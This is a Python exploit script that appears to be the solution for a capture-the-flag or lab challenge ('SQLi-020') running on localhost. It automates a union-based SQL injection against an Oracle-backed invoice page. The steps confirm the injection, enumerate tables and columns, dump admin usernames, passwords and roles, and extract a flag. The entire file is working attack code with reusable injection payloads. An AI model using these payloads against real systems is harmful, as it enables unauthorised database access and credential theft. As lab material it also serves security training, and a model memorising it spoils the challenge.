#!/usr/bin/env python3
"""
SQLi-020: Oracle Union-based Single Column Exploit
Automated exploitation script using || concatenation
"""

import requests
import sys
from urllib.parse import quote

BASE_URL = "http://localhost:5020"

def inject(payload):
    """Send payload and return response text"""
    url = f"{BASE_URL}/invoice?id={quote(payload)}"
    try:
        resp = requests.get(url, timeout=10)
        return resp.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def extract_invoice_number(html):
    """Extract invoice number from HTML response"""
    marker = 'class="invoice-number">'
    start = html.find(marker)
    if start == -1:
        return None
    start += len(marker)
    end = html.find('</div>', start)
    if end == -1:
        return None
    return html[start:end].strip()

def main():
    print("=" * 60)
    print("SQLi-020: Oracle Union-based Single Column Exploit")
    print("=" * 60)
    
    # Step 1: Test injection
    print("\n[*] Step 1: Testing SQL Injection...")
    payload = "2-1"
    html = inject(payload)
    result = extract_invoice_number(html)
    if result and "INV-2024-001" in result:
        print("[+] SQL Injection confirmed (arithmetic works)!")
    else:
        print("[-] SQL Injection not working")
        sys.exit(1)
    
    # Step 2: Find column count
    print("\n[*] Step 2: Confirming single column...")
    payload = "0 UNION SELECT 'TEST123' FROM dual"
    html = inject(payload)
    result = extract_invoice_number(html)
    if result and "TEST123" in result:
        print("[+] Column count: 1 (UNION works)")
    
    # Step 3: Get current user
    print("\n[*] Step 3: Getting current user...")
    payload = "0 UNION SELECT user FROM dual"
    html = inject(payload)
    result = extract_invoice_number(html)
    print(f"[+] Current user: {result}")
    
    # Step 4: Enumerate tables
    print("\n[*] Step 4: Enumerating tables...")
    payload = "0 UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
    html = inject(payload)
    result = extract_invoice_number(html)
    print(f"[+] Tables: {result}")
    
    # Step 5: Enumerate admin_users columns
    print("\n[*] Step 5: Enumerating ADMIN_USERS columns...")
    payload = "0 UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='ADMIN_USERS'"
    html = inject(payload)
    result = extract_invoice_number(html)
    print(f"[+] Columns: {result}")
    
    # Step 6: Extract admin users with || operator
    print("\n[*] Step 6: Extracting admin credentials...")
    payload = "0 UNION SELECT LISTAGG(username||':'||password||':'||role,' | ') WITHIN GROUP (ORDER BY username) FROM admin_users"
    html = inject(payload)
    result = extract_invoice_number(html)
    print("[+] Admin users:")
    if result:
        for user in result.split(' | '):
            print(f"    {user}")
    
    # Step 7: Extract flag
    print("\n[*] Step 7: Extracting flag...")
    payload = "0 UNION SELECT value FROM secrets WHERE name='sqli_020'"
    html = inject(payload)
    result = extract_invoice_number(html)
    if result and "FLAG" in result:
        print(f"\n[+] FLAG FOUND: {result}")
    
    print("\n" + "=" * 60)
    print("Exploitation completed!")
    print("=" * 60)

if __name__ == "__main__":
    main()
